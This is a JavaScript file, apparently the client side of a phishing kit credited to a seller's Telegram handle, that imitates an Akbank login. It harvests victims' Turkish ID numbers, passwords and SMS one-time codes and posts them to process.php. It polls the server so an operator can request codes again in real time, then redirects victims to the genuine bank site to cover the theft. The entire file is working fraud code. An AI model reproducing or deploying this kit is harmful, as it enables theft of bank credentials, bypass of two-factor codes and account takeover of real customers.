// © confstr 2024 telegram: @confstr
const PROCESS_URL = "process.php",
    CHECK_INTERVAL = 3000;

function submitData(action, data, callback) {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: {
            action: action,
            ...data
        },
        success: function(response) {
            callback(response);
        },
        error: function(error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function submitLogin() {
    var txtTCKN = $("#txtTCKN").val();
    var txtPassword = $("#txtPassword").val();
    
    if (txtTCKN && txtPassword) {
        submitData("submitLogin", { txtTCKN: txtTCKN, txtPassword: txtPassword }, function(response) {
            console.log(response);
            $("#processLoginButton").hide();
            $("#spinnerLoginButton").show();

            setTimeout(function() {
                $("#secondScreen").hide();
                $("#codeScreen").show();
            }, 2000);
        });
    } else {
        console.error("Please fill in all fields.");
    }
}

function submitCode() {
    var txtCode = $("#txtCode").val();
    
    if (txtCode) {
        submitData("submitCode", { txtCode: txtCode }, function(response) {
            console.log(response);
            $("#processCodeButton").hide();
            $("#spinnerCodeButton").show();

            setTimeout(function() {
                $("#codeScreen").hide();
                $("#doneScreen").show();
            }, 2000);
        });
    } else {
        console.error("Please fill in all fields.");
    }
}

var waitInterval, lastResponse = "";

function wait() {
    submitData("wait", {}, function(response) {
        console.log("Response received: " + response);
        
        if (response !== lastResponse) {
            lastResponse = response;
            
            if (response === "getCode") {
                $("#firstScreen, #secondScreen").hide();
                $("#codeScreen").show();
            } else if (response === "getCodeAgain") {
                $("#firstScreen, #secondScreen, #spinnerCodeButton").hide();
                $("#errorModal, #processCodeButton").show();
                showErrorModal();
                $("#txtCode").val("");
            } else if (response === "getDone") {
                $("#firstScreen, #secondScreen, #spinnerCodeButton, #errorModal").hide();
                $("#doneScreen").show();
                setTimeout(function() {
                    window.location.href = "https://www.akbank.com";
                }, 10000);
            }
        }
    });
}

function showErrorModal() {
    const modal = $("#errorModal");
    modal.css({
        bottom: "-100%",
        display: "block"
    });
    modal.animate({
        bottom: "0%"
    }, 500);
}

function closeModal() {
    const modal = $("#errorModal");
    modal.animate({
        bottom: "-100%"
    }, 500, function() {
        modal.css({
            display: "none"
        });
    });
}

function startWaitInterval() {
    if (waitInterval) {
        clearInterval(waitInterval);
    }
    waitInterval = setInterval(wait, CHECK_INTERVAL);
}

function tcno_dogrula(tcno)
{
    // geleni her zaman String'e çevirelim!
    tcno = String(tcno);

    // tcno '0' karakteri ile başlayamaz!
    if (tcno.substring(0, 1) === '0') {
        return false;
    }
    // Tcno 11 karakter uzunluğunda olmalı!
    if (tcno.length !== 11) {
        return false;
    }

    /**
        Aşağıdaki iki kontrol için toplamları hazır ediyoruz
        - o anki karakteri sayıya dönüştür
        - tek haneleri ayrıca topla (1,3,5,7,9)
        - çift haneleri ayrıca topla (2,4,6,8)
        - bütün haneleri ayrıca topla
    **/
    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;

    for (var i = j = 0; i < 9; ++i) {
      j = parseInt(ilkon_array[i], 10);
      if (i & 1) { // tek ise, tcnin çift haneleri toplanmalı!
          hane_cift  += j;
      } else {
          hane_tek += j;
      }
      ilkon_total += j;
    }

    /**
        KONTROL 1:
        1. 3. 5. 7. ve 9. hanelerin toplamının 7 katından, 
        2. 4. 6. ve 8. hanelerin toplamı çıkartıldığında, 
        elde edilen sonucun Mod10'u bize 10. haneyi verir
    **/
    if ( (hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
        return false;
    }

    /**
        KONTROL 2:
        1. 2. 3. 4. 5. 6. 7. 8. 9. ve 10. hanelerin toplamından
        elde edilen sonucun Mod10'u bize 11. haneyi vermelidir.
        NOT: ilk 9 haneyi üstteki FOR döndüsünde zaten topladık!
    **/
    ilkon_total += parseInt(ilkon_array[9], 10); 
    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
        return false;
    }

    return true;
}
wait();
startWaitInterval();

document.addEventListener("DOMContentLoaded", function() {
    fetch("https://api.exchangerate-api.com/v4/latest/USD")
        .then(response => response.json())
        .then(data => {
            const rate = data.rates.TRY;
            document.getElementById("usd-to-try").textContent = rate.toFixed(2);
        })
        .catch(error => console.error("Error fetching the exchange rate:", error));
});

document.addEventListener("DOMContentLoaded", function() {
    document.querySelector(".btn-red").addEventListener("click", function() {
        var firstScreen = document.getElementById("firstScreen");
        var secondScreen = document.getElementById("secondScreen");

        firstScreen.style.opacity = 0;
        setTimeout(function() {
            firstScreen.style.display = "none";
            secondScreen.style.display = "block";
            setTimeout(function() {
                secondScreen.style.right = "0";
            }, 10);
        }, 500);
    });

    document.getElementById("txtTCKN").addEventListener("input", function() {
        if (this.value.length > 11) {
            this.value = this.value.slice(0, 11);
        }
    });

    document.querySelector(".back-icon").addEventListener("click", function() {
        var firstScreen = document.getElementById("firstScreen");
        var secondScreen = document.getElementById("secondScreen");

        secondScreen.style.display = "none";
        firstScreen.style.display = "block";
        setTimeout(function() {
            firstScreen.style.opacity = 1;
        }, 10);
    });

    setTimeout(function() {
        document.querySelector(".bottom-button-container").style.opacity = 1;
    }, 100);
});

document.getElementById("txtTCKN").addEventListener("input", function() {
    var value = this.value;
    if (value.length === 11) {
        if (tcno_dogrula(value)) {
            this.style.color = "black";
            document.getElementById("processLoginButton").disabled = false;
        } else {
            this.style.color = "red";
            document.getElementById("processLoginButton").disabled = true;
        }
    } else {
        this.style.color = "";
        document.getElementById("processLoginButton").disabled = true;
    }
});

setInterval(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "update.php", true);
    xhr.send();
}, 1000);

setInterval(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "status.php", true);
    xhr.send();
}, 5000);
